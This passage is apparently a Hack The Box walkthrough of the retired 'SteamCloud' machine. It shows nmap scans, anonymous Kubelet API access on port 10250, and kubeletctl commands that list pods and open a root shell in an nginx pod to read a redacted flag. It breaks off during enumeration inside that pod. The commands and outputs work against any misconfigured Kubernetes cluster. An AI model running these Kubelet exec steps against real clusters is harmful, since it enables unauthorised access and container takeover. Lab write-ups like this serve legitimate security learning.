[{"content":"Box Info Attribute Details Level Easy OS Linux Box URL https://app.hackthebox.com/machines/443 Box Status Retired About Box SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes-specific ports open. We can not enumerate the Kubernetes API because it requires authentication. Now, as Kubelet allows anonymous access, we can extract a list of all the pods from the K8S cluster by enumerating the Kubelet service. Furthermore, we can get into one of the pods and obtain the keys necessary to authenticate to the Kubernetes API. We can now create and spawn a malicious pod and then use Kubectl to run commands within the pod to read the root flag. Footprinting Nmap - basic Let\u0026rsquo;s start with scanning the machine IP with nmap to check what are the services are running on different ports!\nnmap -p 22,2379,2380,8443,10249,10250,10256 --min-rate 10000 $ip -oN 1.basic.nmap.txt Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-02 21:45 +0530 Nmap scan report for 10.10.11.133 Host is up (0.25s latency). PORT STATE SERVICE 22/tcp open ssh 2379/tcp open etcd-client 2380/tcp open etcd-server 8443/tcp open https-alt 10249/tcp open unknown 10250/tcp open unknown 10256/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds Nmap - detailed nmap -sCV -p 22,2379,2380,8443,10249,10250,10256 $ip -oN 3.detailed.nmap.txt Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-02 21:55 +0530 Nmap scan report for 10.10.11.133 Host is up (0.31s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA) | 256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA) |_ 256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519) 2379/tcp open ssl/etcd-client? | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2025-10-02T16:08:35 |_Not valid after: 2026-10-02T16:08:35 | tls-alpn: |_ h2 |_ssl-date: TLS randomness does not represent time 2380/tcp open ssl/etcd-server? | tls-alpn: |_ h2 | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2025-10-02T16:08:35 |_Not valid after: 2026-10-02T16:08:36 |_ssl-date: TLS randomness does not represent time 8443/tcp open ssl/http Golang net/http server | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden | Audit-Id: 13ad7bea-1258-4ffc-acfb-b23dc09805f8 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd | X-Kubernetes-Pf-Prioritylevel-Uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2 | Date: Thu, 02 Oct 2025 16:25:32 GMT | Content-Length: 212 | {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot get path \u0026#34;/nice ports,/Trinity.txt.bak\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} | GenericLines, Help, RTSPRequest, SSLSessionReq: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 403 Forbidden | Audit-Id: 6a334c86-3068-4f26-8887-5adf56610e19 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd | X-Kubernetes-Pf-Prioritylevel-Uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2 | Date: Thu, 02 Oct 2025 16:25:29 GMT | Content-Length: 185 |_ {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot get path \u0026#34;/\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} | ssl-cert: Subject: commonName=minikube/organizationName=system:masters | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 | Not valid before: 2025-10-01T16:08:33 |_Not valid after: 2028-10-01T16:08:33 |_http-title: Site doesn\u0026#39;t have a title (application/json). | tls-alpn: | h2 |_ http/1.1 |_ssl-date: TLS randomness does not represent time 10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). | ssl-cert: Subject: commonName=steamcloud@1759421317 | Subject Alternative Name: DNS:steamcloud | Not valid before: 2025-10-02T15:08:37 |_Not valid after: 2026-10-02T15:08:37 | tls-alpn: | h2 |_ http/1.1 |_ssl-date: TLS randomness does not represent time 10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). Found open ports: 22 (SSH), 2379 (etcd), 2380 (etcd), 8443 (http), 10249 (kubelet), 10250 (kubelet), 10256 (http) The web application running on port 8443 is showing 403 Forbidden with the message \u0026ldquo;User \u0026lsquo;system: anonymous\u0026rsquo; cannot get path \u0026lsquo;/\u0026rsquo;\u0026rdquo; Identified multiple subject alternative names related to Kubernetes. Subject Alternative Name:\nDNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 Letâ€™s add steamcloud host to our /etc/hosts file:\necho \u0026#34;10.10.11.133 steamcloud.htb\u0026#34; | sudo tee -a /etc/hosts Enumeration SSH 22 We tried the same for SSH by attempting an anonymous login, but it was unsuccessful.\nssh anonymous@steamcloud.htb The authenticity of host \u0026#39;steamcloud.htb (10.10.11.133)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:/BfbWBuZ6K3xx1f7py/c7eMZ1Wedb7sKF5yhMHNXHZ4. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;steamcloud.htb\u0026#39; (ED25519) to the list of known hosts. anonymous@steamcloud.htb\u0026#39;s password: Permission denied, please try again. Port 8443 Response Headers:\ncurl -ik https://steamcloud.htb:8443/ HTTP/2 403 audit-id: 852abb91-1bd8-400d-8616-1c7511c78885 cache-control: no-cache, private content-type: application/json x-content-type-options: nosniff x-kubernetes-pf-flowschema-uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd x-kubernetes-pf-prioritylevel-uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2 content-length: 233 date: Thu, 02 Oct 2025 16:34:49 GMT { \u0026#34;kind\u0026#34;: \u0026#34;Status\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;metadata\u0026#34;: { }, \u0026#34;status\u0026#34;: \u0026#34;Failure\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;forbidden: User \\\u0026#34;system:anonymous\\\u0026#34; cannot get path \\\u0026#34;/\\\u0026#34;\u0026#34;, \u0026#34;reason\u0026#34;: \u0026#34;Forbidden\u0026#34;, \u0026#34;details\u0026#34;: { }, \u0026#34;code\u0026#34;: 403 } Based on the response headers, it was observed that the application is running on Kubernetes. It was giving a 403 Forbidden, which indicates the Kubernetes API server is rejecting the request because system:anonymous does not have permission to access that path.\n\u0026gt; kubectl --server https://10.10.11.133:8443 get pods Unable to connect to the server: tls: failed to verify certificate: x509: certificate signed by unknown authority I tried to access port 8443 using kubectl, but it was asking for a valid username and password, which I couldn\u0026rsquo;t brute-force.\nKubernetes Ports Protocol Direction Port Range Purpose Used By TCP Inbound 6443 Kubernetes API server All TCP Inbound 2379-2380 etcd server client API kube-apiserver, etcd TCP Inbound 10250 Kubelet API Self, Control plane TCP Inbound 10259 kube-scheduler Self TCP Inbound 10257 kube-controller-manager Self Reference: https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane\nPort 10250 Port 10250 on the kubelet is used by the kube-apiserver for exec and logs.\nI came across this gist repo about \u0026ldquo;Accessing the kubelet-api\u0026rdquo; by lizrice. First, I tried to list pods using a simple GET request to check whether listing pods as anonymous-auth was possible.\ncurl -sk https://10.10.11.133:10250/pods/ IfÂ --anonymous-authÂ is turned off, you will see aÂ 401 UnauthorizedÂ response. IfÂ --anonymous-authÂ isÂ trueÂ andÂ --authorization-modeÂ isÂ WebhookÂ you\u0026rsquo;ll seeÂ 403 ForbiddenÂ response with messageÂ Forbidden (user=system:anonymous, verb=get, resource=nodes, subresource=proxy) IfÂ --anonymous-authÂ isÂ trueÂ andÂ --authorization-modeÂ isÂ AlwaysAllowÂ you\u0026rsquo;ll see a list of pods. We got the proper 200 OK response which means that --anonymous-auth is true and --authorization-mode is AlwaysAllow.\nResponse:\n{\u0026#34;kind\u0026#34;:\u0026#34;PodList\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;items\u0026#34;:[{\u0026#34;metadata\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;etcd-steamcloud\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;kube-system\u0026#34;,\u0026#34;selfLink\u0026#34;:\u0026#34;/api/v1/namespaces/kube-system/pods/etcd-steamcloud\u0026#34;,\u0026#34;uid\u0026#34;:\u0026#34;967b9bee71f2e3cec06ff1dbde2a2a19\u0026#34;,\u0026#34;creationTimestamp\u0026#34;:null,\u0026#34;labels\u0026#34;:{\u0026#34;component\u0026#34;:\u0026#34;etcd\u0026#34;,\u0026#34;tier\u0026#34;:\u0026#34;control-plane\u0026#34;},\u0026#34;annotations\u0026#34;:{\u0026#34;kubeadm.kubernetes.io/etcd.advertise-client-urls\u0026#34;:\u0026#34;https://10.10.11.133:2379\u0026#34;,\u0026#34;kubernetes.io/config.hash\u0026#34;:\u0026#34;967b9bee71f2e3cec06ff1dbde2a2a19\u0026#34;,\u0026#34;kubernetes.io/config.seen\u0026#34;:\u0026#34;2025-10-02T12:08:51.371667834-04:00\u0026#34;,\u0026#34;kubernetes.io/config.source\u0026#34;:\u0026#34;file\u0026#34;}} We found the article by cyberark about kubelet client attack which shows how to use the different api endpoints manually to list pods or run the commands insides the container. While using this command one by one to find the token and go though the multiple directories it will be complicated and time consuming at the same time.\nKubelet API endpoints to perform the multiple task:\nKubelet API Examples for use Description /pods GET /pods List the pods in the kubeletâ€™s worker /run POST /run/\u0026lt;podNamespace\u0026gt;/\u0026lt;podID\u0026gt;/\u0026lt;containerName\u0026gt; POST /run/\u0026lt;podNamespace\u0026gt;/\u0026lt;podID\u0026gt;/\u0026lt;uid\u0026gt;/\u0026lt;containerName\u0026gt; Body: \u0026lt;command\u0026gt; Run command in a container /exec GETÂ /exec/\u0026lt;podNamespace\u0026gt;/\u0026lt;podID\u0026gt;/\u0026lt;containerName\u0026gt;?command=\u0026lt;command\u0026gt; POST /exec/\u0026lt;podNamespace\u0026gt;/\u0026lt;podID\u0026gt;/\u0026lt;containerName\u0026gt;?command=\u0026lt;command\u0026gt; GETÂ /exec/\u0026lt;podNamespace\u0026gt;/\u0026lt;podID\u0026gt;/\u0026lt;uid\u0026gt;/\u0026lt;containerName\u0026gt;?command=\u0026lt;command\u0026gt; POST /exec/\u0026lt;podNamespace\u0026gt;/\u0026lt;podID\u0026gt;/\u0026lt;uid\u0026gt;/\u0026lt;containerName\u0026gt;?command=\u0026lt;command\u0026gt; Run command using a stream in a container /configz GET /configz Kubeletâ€™s configuration file settings /debug GET /debug/flags/v\nPUT /debug/flags/v (body: \u0026lt;integer\u0026gt;) GET /debug/pprof/\u0026lt;profile\u0026gt; Debug information Kubeletctl The above mentioned blog also mentions about the tool called kubeletctl which can be used to make command execution and pods listing process easy. If you are using mac to solve this problem you might face issue while installing and using the tool. It\u0026rsquo;s recommended to use the docker image which can be easiest way to install and run the tool without facing any architecture or dependency related issue.\nList the running pods using below mentioned command and it will give the proper table format output.\n/ $ kubeletctl pods --server 10.10.11.133 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ Pods from Kubelet â”‚ â”œâ”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ â”‚ POD â”‚ NAMESPACE â”‚ CONTAINERS â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 1 â”‚ coredns-78fcd69978-l4jd5 â”‚ kube-system â”‚ coredns â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 2 â”‚ nginx â”‚ default â”‚ nginx â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 3 â”‚ etcd-steamcloud â”‚ kube-system â”‚ etcd â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 4 â”‚ kube-apiserver-steamcloud â”‚ kube-system â”‚ kube-apiserver â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 5 â”‚ kube-controller-manager-steamcloud â”‚ kube-system â”‚ kube-controller-manager â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 6 â”‚ kube-scheduler-steamcloud â”‚ kube-system â”‚ kube-scheduler â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 7 â”‚ storage-provisioner â”‚ kube-system â”‚ storage-provisioner â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 8 â”‚ kube-proxy-5lw7m â”‚ kube-system â”‚ kube-proxy â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â””â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Scan for command execution related permission:\nkubeletctl scan rce --server 10.10.11.133 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ Node with pods vulnerable to RCE â”‚ â”œâ”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¤ â”‚ â”‚ NODE IP â”‚ PODS â”‚ NAMESPACE â”‚ CONTAINERS â”‚ RCE â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ RUN â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤ â”‚ 1 â”‚ 10.10.11.133 â”‚ kube-scheduler-steamcloud â”‚ kube-system â”‚ kube-scheduler â”‚ - â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤ â”‚ 2 â”‚ â”‚ storage-provisioner â”‚ kube-system â”‚ storage-provisioner â”‚ - â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤ â”‚ 3 â”‚ â”‚ kube-proxy-5lw7m â”‚ kube-system â”‚ kube-proxy â”‚ + â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤ â”‚ 4 â”‚ â”‚ coredns-78fcd69978-l4jd5 â”‚ kube-system â”‚ coredns â”‚ - â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤ â”‚ 5 â”‚ â”‚ nginx â”‚ default â”‚ nginx â”‚ + â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤ â”‚ 6 â”‚ â”‚ etcd-steamcloud â”‚ kube-system â”‚ etcd â”‚ - â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤ â”‚ 7 â”‚ â”‚ kube-apiserver-steamcloud â”‚ kube-system â”‚ kube-apiserver â”‚ - â”‚ â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤ â”‚ 8 â”‚ â”‚ kube-controller-manager-steamcloud â”‚ kube-system â”‚ kube-controller-manager â”‚ - â”‚ â””â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜ Getting User shell Based on kubeletctl scan rce command, We will go ahead and attack the ngnix pod and run the whoami command and it was observed that the pod is running as the root.\n/ $ kubeletctl exec \u0026#34;whoami\u0026#34; -p nginx -c nginx --server 10.10.11.133 root Instead of passing command using the kubeletctl exec we can simply go ahead any take a shell so we can interact with a shell properly and do further enumeration to get the user flag.\n/ $ kubeletctl exec \u0026#34;/bin/bash\u0026#34; -p nginx -c nginx --server 10.10.11.133 root@nginx:/# User Flag ğŸš© We have the shell. Let\u0026rsquo;s read the user flag and move ahead for root flag.\nroot@nginx:~# ls user.txt root@nginx:~# cat user.txt REDECTED_FLAG_VALUE We already have the root user access but flag doesn\u0026rsquo;t exist in the /root directory. We can check the env and mounted directory or we can run the linpeas as well.\nThe environment variables:\nroot@nginx:~# env HOSTNAME=nginx 